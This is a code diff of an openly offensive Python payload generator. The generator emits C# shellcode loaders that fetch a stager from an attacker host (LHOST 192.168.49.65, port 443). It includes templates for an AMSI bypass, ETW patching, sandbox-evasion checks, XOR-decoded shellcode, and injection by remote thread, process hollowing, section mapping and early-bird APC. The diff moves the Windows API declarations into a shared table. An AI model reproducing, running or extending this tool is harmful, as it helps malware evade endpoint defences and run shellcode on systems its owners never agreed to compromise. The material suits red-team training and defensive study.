@@ -1,6 +1,7 @@
 import base64
 import os
 import subprocess
+from libpinvoke import PINVOKE
 
 # References:
 # https://github.com/plackyhacker/Shellcode-Injection-Techniques
@@ -11,24 +12,14 @@ LHOST = "192.168.49.65"
 LPORT = "443"
 STAGER_URL = f"http://{LHOST}/sc"
 
-DLL_IMPORT = {
-  "VirtualAlloc": "",
-  "CreateThread": "",
-  "WaitForSingleObject": "",
-  "NtCreateSection":"",
-  "NtMapViewOfSection":"",
-
-}
-
-AMSI_BYPASS_IMPORT = """
+AMSI_BYPASS_IMPORT = f"""
   // [DllImport("kernel32")]
   // public static extern IntPtr LoadLibrary(string name);
   // [DllImport("kernel32")]
   // public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
   // [DllImport("kernel32")]
   // public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-  [DllImport("kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
-  static extern void MoveMemory(IntPtr dest, IntPtr src, int size);
+  {PINVOKE["MoveMemory"]}
 """
 
 AMSI_BYPASS_CODE = """
@@ -49,16 +40,12 @@ AMSI_BYPASS_CODE = """
 
 """
 
-ETW_FUNCS = """
-[DllImport("kernel32")]
-public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-
-[DllImport("kernel32")]
-public static extern IntPtr LoadLibrary(string name);
-
-[DllImport("kernel32")]
-public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-
+ETW_FUNCS = f"""
+  {PINVOKE["GetProcAddress"]}
+  {PINVOKE["LoadLibrary"]}
+  {PINVOKE["VirtualProtect"]}
+"""
+ETW_FUNCS += """
 private static byte[] getETWPayload()
     {
         if (!is64Bit())
@@ -94,15 +81,11 @@ ARCH_DETECTION = """
         }
 """
 
-HEURISTICS_IMPORT = """
-    [DllImport("kernel32.dll")]
-    static extern void Sleep(uint dwMilliseconds);
-    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-    static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
-    [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern IntPtr GetCurrentProcess();
-    [DllImport("kernel32.dll", SetLastError = true)]
-    static extern UInt32 FlsAlloc(IntPtr callback);
+HEURISTICS_IMPORT = f"""
+  {PINVOKE["Sleep"]}
+  {PINVOKE["VirtualAllocExNuma"]}
+  {PINVOKE["GetCurrentProcess"]}
+  {PINVOKE["FlsAlloc"]}
 """
 
 HEURISTICS_CODE = """
@@ -145,29 +128,21 @@ SC_XOR_DECODER = """
 ETW_PATCH = "PatchEtw(getETWPayload());"
 
 
-START_PROCESS_INJECT_IMPORT = """
-    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
-    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
-    [DllImport("kernel32.dll")]
-    static extern bool WriteProcessMemory( IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
-    [DllImport("kernel32.dll")]
-    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-
+START_PROCESS_INJECT_IMPORT = f"""
+    {PINVOKE["VirtualAllocEx"]} 
+    {PINVOKE["OpenProcess"]} 
+    {PINVOKE["WriteProcessMemory"]} 
+    {PINVOKE["CreateRemoteThread"]} 
 """
 
-START_SHELLCODE_IMPORT = """
-        private static UInt32 MEM_COMMIT = 0x3000;
-        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
-        [DllImport("kernel32")]
-        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
-        [DllImport("kernel32")]
-        private static extern IntPtr CreateThread( UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
-        [DllImport("kernel32")]
-        private static extern UInt32 WaitForSingleObject( IntPtr hHandle, UInt32 dwMilliseconds);
+START_SHELLCODE_IMPORT = f"""
+         {PINVOKE["VirtualAlloc"]}
+         {PINVOKE["CreateThread"]}
+         {PINVOKE["WaitForSingleObject"]}
 """
 START_SHELLCODE = """
+            UInt32 MEM_COMMIT = 0x3000;
+            UInt32 PAGE_EXECUTE_READWRITE = 0x40;
             UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
             Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
             IntPtr hThread = IntPtr.Zero;
@@ -203,7 +178,14 @@ START_PROCESS_INJECT = """
           }
 """
 
-START_PROCESS_HOLLOW_IMPORT = """
+START_PROCESS_HOLLOW_IMPORT =  f"""
+         {PINVOKE["CreateProcess"]}
+         {PINVOKE["ZwQueryInformationProcess"]}
+         {PINVOKE["ReadProcessMemory"]}
+         {PINVOKE["WriteProcessMemory"]}
+         {PINVOKE["ResumeThread"]}
+"""
+START_PROCESS_HOLLOW_IMPORT += """
         [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
         struct STARTUPINFO
         {
@@ -247,21 +229,6 @@ START_PROCESS_HOLLOW_IMPORT = """
                 public IntPtr InheritedFromUniqueProcessId;
         }
 
-        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
-        static extern bool CreateProcess( string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
-
-        [DllImport("ntdll.dll", SetLastError = true)]
-        static extern UInt32 ZwQueryInformationProcess( IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, UInt32 ProcInfoLen, ref UInt32 retlen);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        static extern bool ReadProcessMemory( IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
-
-        [DllImport("kernel32.dll")]
-        static extern bool WriteProcessMemory( IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        static extern uint ResumeThread(IntPtr hThread);
-
 """
 
 START_PROCESS_HOLLOW_CODE = """
@@ -299,21 +266,14 @@ START_PROCESS_HOLLOW_CODE = """
       ResumeThread(pi.hThread);
 """
 
-START_PROCESS_INTERPROCESS_IMPORT = """
-        [DllImport("ntdll.dll", SetLastError=true)]
-        static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);
-
-        [DllImport("ntdll.dll", ExactSpelling=true, SetLastError=false)]
-        static extern int NtClose(IntPtr hObject);
-
-        [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
-        public static extern UInt32 NtCreateSection(ref IntPtr SectionHandle, SectionAccess DesiredAccess, IntPtr ObjectAttributes, ref UInt64 MaximumSize, MemoryProtection SectionPageProtection,	MappingAttributes AllocationAttributes, IntPtr FileHandle);
-
-        [DllImport("ntdll.dll", SetLastError = true)]
-        public static extern UInt32 NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, UIntPtr ZeroBits, UIntPtr CommitSize, ref UInt64 SectionOffset, ref UInt64 ViewSize, uint InheritDisposition, UInt32 AllocationType, MemoryProtection Win32Protect);
-
-        [DllImport("ntdll.dll", SetLastError = true)]
-        public static extern IntPtr RtlCreateUserThread(IntPtr processHandle, IntPtr threadSecurity, bool createSuspended, Int32 stackZeroBits, IntPtr stackReserved, IntPtr stackCommit, IntPtr startAddress, IntPtr parameter, ref IntPtr threadHandle, CLIENT_ID clientId);
+START_PROCESS_INTERPROCESS_IMPORT = f"""
+  {PINVOKE["NtUnmapViewOfSection"]}
+  {PINVOKE["NtClose"]}
+  {PINVOKE["NtCreateSection"]}
+  {PINVOKE["NtMapViewOfSection"]}
+  {PINVOKE["RtlCreateUserThread"]}
+""" 
+START_PROCESS_INTERPROCESS_IMPORT += """
 
         [Flags]
 	public enum SectionAccess : UInt32
@@ -390,59 +350,18 @@ START_PROCESS_INTERPROCESS_CODE = """
 """
 
 
-START_PROCESS_EARLYBIRD_IMPORT = """
-        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-        public static extern IntPtr VirtualAllocEx(
-            IntPtr hProcess, 
-            IntPtr lpAddress,
-            uint dwSize,
-            AllocationType flAllocationType,
-            AllocationProtect flProtect);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        public static extern IntPtr OpenProcess(
-            uint processAccess,
-            bool bInheritHandle,
-            int processId);
-
-        [DllImport("kernel32.dll")]
-        public static extern IntPtr CreateRemoteThread(
-            IntPtr hProcess,
-            IntPtr lpThreadAttributes,
-            uint dwStackSize,
-            IntPtr lpStartAddress,
-            IntPtr lpParameter,
-            uint dwCreationFlags,
-            out IntPtr lpThreadId);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        public static extern UInt32 QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, UInt32 dwData);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        [return: MarshalAs(UnmanagedType.Bool)]
-        public static extern bool CloseHandle(IntPtr hObject);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        public static extern uint ResumeThread(IntPtr hThread);
-
-        [DllImport("ntdll.dll", SetLastError = true)]
-        public static extern NTSTATUS NtWriteVirtualMemory(
-            IntPtr ProcessHandle,
-            IntPtr BaseAddress,
-            byte[] buffer,
-            UInt32 nSize,
-            ref UInt32 lpNumberOfBytesWritten
-        );
-
-        [DllImport("kernel32.dll")]
-        public static extern void RtlZeroMemory(IntPtr pBuffer, int length);
-
-        [DllImport("kernel32")]
-        public static extern UInt32 WaitForSingleObject(
-            IntPtr hHandle,
-            UInt32 dwMilliseconds
-        );
-
+START_PROCESS_EARLYBIRD_IMPORT = f"""
+         {PINVOKE["VirtualAllocEx2"]}
+         {PINVOKE["OpenProcess"]}
+         {PINVOKE["CreateRemoteThread2"]}
+         {PINVOKE["QueueUserAPC"]}
+         {PINVOKE["ResumeThread"]}
+         {PINVOKE["CloseHandle"]}
+         {PINVOKE["NtWriteVirtualMemory"]}
+         {PINVOKE["RtlZeroMemory"]}
+         {PINVOKE["WaitForSingleObject"]}
+"""
+START_PROCESS_EARLYBIRD_IMPORT += """
                 [Flags]
         public enum NTSTATUS : uint
         {
@@ -594,7 +513,7 @@ class Obfuscator:
     return base64.b64encode(bytes(self.encoded))
 
   def get_hex_c(self):
-    return ",".join("\\x%02x" % b for b in self.encoded)
+    return "".join("\\x%02x" % b for b in self.encoded)
 
   def get_hex_csharp(self):
     return ",".join("0x%02x" % b for b in self.encoded)
